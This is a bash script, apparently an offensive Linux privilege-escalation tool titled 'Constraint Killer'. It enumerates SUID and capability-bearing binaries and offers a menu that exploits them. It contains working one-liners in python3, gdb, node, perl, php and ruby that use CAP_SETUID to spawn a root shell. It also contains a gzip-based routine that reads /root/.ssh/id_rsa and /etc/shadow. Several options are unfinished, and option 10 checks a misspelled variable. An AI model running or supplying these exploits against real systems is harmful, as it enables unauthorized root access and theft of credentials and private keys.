#!/bin/bash
cat << 'EOF'                                                  
                            .,:                   
                        .l0WMMMd                  
                       xMMMMMMMW                  
      ....           l:..cOWMWWW       '::       
     cMMMMMMMMMMM0. 0MMMKo  ....   ,xXMMMM'      
    xMMMMMMMMMMMO .XMMMMN, cXMMMNd .WMMMMMd      
   OMMMMMMMMMMMo ;WMMMMN. KMMMMMMMd ;0MMMMd      
   .;oONMMMMMM: oMMMMMM, 0MMMMMMMM, :. ;xX'      
        .;oOX' kMMMMMMN 'MMMMMMMW: oMMNx;        
             .KMMMMMMMN ,MMMMMWd..OMMMMMl        
             cXMMMMMMMM: l00d; .xWMMMMW, :       
              ..:kNMMMM0 .;;cxXMMMMMMN. OMK.     
           ,xNMXd, .l0x ,WMMMMMMMMMMK..XMMMW;    
         .KMMMMMMMN     dXMMMMMMMMMk 'NMMMMMMo                    
        ;, 'oKMMMMX      ..cOWMMMMl :MMMMMMMMM0  
       dMl .c .:kN;   c0MMKo' 'oK;  xWMMMMMMMMMx 
      0W; ;WO  o'   ,NMMMMMMMo        :OMMMMMMd  
    .XN. oMo .XX.  :. ,dXMMMMc          .lXMMc   
   ,W0  kW: ,W0  .0W, ;: .cON              .'    
  cMx .KN' cMx  .NX. oMo .o.                      
 .Ml ,NK. dMl  ,WO  xM: ,W0                       
 ., cMk  OW,  lMd  0W' :Mx          Just Elevate These Privileges Already ! Constraint Killer              
   ,kc  ok.  ,kc  dk. .kl                              

████████████████████████████████████████████████████████████████████████████████████████████████████████

       █████ ██████████ ███████████ ███████████    █████████     █████████  █████   ████    ███ ███ ███
      ░░███ ░░███░░░░░█░█░░░███░░░█░░███░░░░░███  ███░░░░░███   ███░░░░░███░░███   ███░    ░███░███░███
       ░███  ░███  █ ░ ░   ░███  ░  ░███    ░███ ░███    ░███  ███     ░░░  ░███  ███      ░███░███░███
       ░███  ░██████       ░███     ░██████████  ░███████████ ░███          ░███████       ░███░███░███
       ░███  ░███░░█       ░███     ░███░░░░░░   ░███░░░░░███ ░███          ░███░░███      ░███░███░███
 ███   ░███  ░███ ░   █    ░███     ░███         ░███    ░███ ░░███     ███ ░███ ░░███     ░░░ ░░░ ░░░ 
░░████████   ██████████    █████    █████        █████   █████ ░░█████████  █████ ░░████    ███ ███ ███
 ░░░░░░░░   ░░░░░░░░░░    ░░░░░    ░░░░░        ░░░░░   ░░░░░   ░░░░░░░░░  ░░░░░   ░░░░    ░░░ ░░░ ░░░ 
EOF
echo " "
echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"
echo " "

echo "Root Shell (CAP_SETUID Capability) : "
ShellCap=$(getcap -r / 2>/dev/null | grep setuid | grep -Ff ./Dependencies/ShellCap.txt | awk -F' = ' '{print $1}' | awk '{print $1}')
echo "$ShellCap"
echo " "

echo "Shell (Sudo) : [WORKINPROGRESS]"
echo " "

echo "Shell (SUID) : "
ShellSUID=$(find / -type f -perm -4000 2>/dev/null | while read -r p; do echo "$(basename "$p") $p"; done | grep -f <(sed 's|^|^|;s|$| .*|' ./Dependencies/ShellSUID.txt) | cut -d' ' -f2-)
echo "$ShellSUID"
echo " "

echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"
echo " "

echo "Reverse Shell (Sudo) : [WORKINPROGRESS]"
echo " "

echo "Reverse Shell (SUID) : "
RevShellSUID=$(find / -type f -perm -4000 2>/dev/null | while read -r p; do echo "$(basename "$p") $p"; done | grep -f <(sed 's|^|^|;s|$| .*|' ./Dependencies/RevShellSUID.txt) | cut -d' ' -f2-)
echo "$RevShellSUID"
echo " "

echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"
echo " "

echo "File Write (Sudo) : [WORKINPROGRESS]"
echo " "

echo "File Write (SUID) : "
FileWriteSUID=$(find / -type f -perm -4000 2>/dev/null | while read -r p; do echo "$(basename "$p") $p"; done | grep -f <(sed 's|^|^|;s|$| .*|' ./Dependencies/FileWriteSUID.txt) | cut -d' ' -f2-)
echo "$FileWriteSUID"
echo " "

echo "████████████████████████████████████████████████████████████████████████████████████████████████████████"
echo " "

echo "File Read (CAP_DAC_OVERRIDE Capability) : "
FileReadCap=$(getcap -r / 2>/dev/null | grep dac_override | grep -Ff ./Dependencies/FileReadCap.txt | awk -F' = ' '{print $1}' | awk '{print $1}')
echo "$FileReadCap"
echo " "

echo "File Read (Sudo) : [WORKINPROGRESS]"
echo " "

echo "File Read (SUID) : "
FileReadSUID=$(find / -type f -perm -4000 2>/dev/null | while read -r p; do echo "$(basename "$p") $p"; done | grep -f <(sed 's|^|^|;s|$| .*|' ./Dependencies/FileReadSUID.txt) | cut -d' ' -f2-)
echo "$FileReadSUID"
echo " "

while true; do
    echo "Categories : "
    echo " "
    echo "1) Root Shell (CAP_SETUID Capability)"
    echo "2) Root Shell (Sudo) [WORKINPROGRESS]"
    echo "3) Root Shell (SUID)"
    echo "4) Reverse Shell (Sudo) [WORKINPROGRESS]"
    echo "5) Reverse Shell (SUID)"
    echo "6) File Write (Sudo) [WORKINPROGRESS]"
    echo "7) File Write (SUID)"
    echo "8) File Read (CAP_DAC_OVERRIDE Capability)"
    echo "9) File Read (Sudo) [WORKINPROGRESS]"
    echo "10) File Read (SUID)"
    echo "11) Quit"
    echo " "    
    read -p "Vulnerability Choice : " choix

    case "$choix" in
        1)
            echo "Root Shell (CAP_SETUID Capability) : "
            if [ -z "$ShellCap" ]; then
                echo "No Vulnerables CAP_SETUID Capable Binaries Detected"
                continue
            else
                echo "Vulnerables Binaries :"
                echo "$ShellCap"
            fi
            
            select choice in $ShellCap "Go Back"; do
                case "$choice" in
                    *python3*)
                        echo "Trying with python3"
                        "$choice" -c 'import os; os.setuid(0); os.system("bash")'
                        ;;
                    *gdb*)
                        echo "Trying with gdb"
                        "$choice" -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
                        ;;
                    *node*)
                        echo "Trying with node"
                        "$choice" -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
                        ;;
                    *perl*)
                        echo "Trying with perl"
                        "$choice" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
                        ;;
                    *php*)
                        echo "Trying with php"
                        "$choice" -r 'posix_setuid(0); system("/bin/sh -i");'
                        ;;
                    *ruby*)
                        echo "Trying with ruby"
                        "$choice" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
                        ;;
                    "Go Back")
                        break
                        ;;
                    *)
                        echo "Invalid Choice, Choose From : "
                        printf '%s\n' "$ShellCap" | nl -w2 -s') '
                        ;;
                esac
            done               
            ;;




            
        2)
            echo "Root Shell (Sudo) : [WORKINPROGRESS]"
            break
            ;;




            
        3)
            echo "Root Shell (SUID) : "
            if [ -z "$ShellSUID" ]; then
                echo "No Root Shell Vulnerables SUID Binaries Detected"
                continue
            else
                echo "Vulnerables Binaries :"
                echo "$ShellSUID"
            fi




            

            ;;
        4)
            echo "Reverse Shell (Sudo) : [WORKINPROGRESS]"

            ;;




            
        5)
            echo "Reverse Shell (SUID) : "
            if [ -z "$RevShellSUID" ]; then
                echo "No Reverse Shell Vulnerables SUID Binaries Detected"
                continue
            else
                echo "Vulnerables Binaries :"
                echo "$RevShellSUID"
            fi




            
            ;;




            
        6)
            echo "File Write (Sudo) : [WORKINPROGRESS]"

            ;;




            
        7)
            echo "File Write (SUID) : "
            if [ -z "$FileWriteSUID" ]; then
                echo "No File Write Vulnerables SUID Binaries Detected"
                continue
            else
                echo "Vulnerables Binaries :"
                echo "$FileWriteSUID"
            fi






            ;;
        8)
            echo "File Read (CAP_DAC_OVERRIDE Capability) : "
            if [ -z "$FileReadCap" ]; then
                echo "No File Read Vulnerable CAP_DAC_OVERRIDE Capable Binaries Detected"
                continue
            else
                echo "Vulnerables Binaries :"
                echo "$FileReadCap"
            fi
            
            select choice in $FileReadCap "Go Back"; do
                case "$choice" in
                    *gzip*)
                        while true; do
                            select file in "/root/.ssh/id_rsa" "/etc/shadow" "Autre" "Retour"; do
                                case "$file" in
                                    "Retour")
                                        break 2
                                        ;;

                                    "Autre")
                                        read -p "File : " file
                                        ;;

                                    *)
                                        gzip -c "$file" | gzip -d
                                        ;;

                                esac

                                break
                            done

                            echo "Read another file ?"

                            select again in "Oui" "Non"; do
                                case "$again" in
                                    Oui) break ;;
                                    Non) break 2 ;;
                                esac
                            done
                        done
                        ;;
                    "Go Back")
                        break
                        ;;  
                    *)
                        echo "Choix invalide"
                        ;;
                esac
            done
            ;;




            
        9)
            echo "File Read (Sudo) : [WORKINPROGRESS]"

            ;;




            
        10)
            echo "File Read (SUID) : "
            if [ -z "$FileReadSuid" ]; then
                echo "No File Read Vulnerables SUID Binaries Detected"
                continue
            else
                echo "Vulnerables Binaries :"
                echo "$FileReadSuid"
            fi






            ;;
        11)
            echo "Quit"
            exit 0
            ;;
        *)
            echo "Invalid Choice, Restart"
            ;;
    esac
done
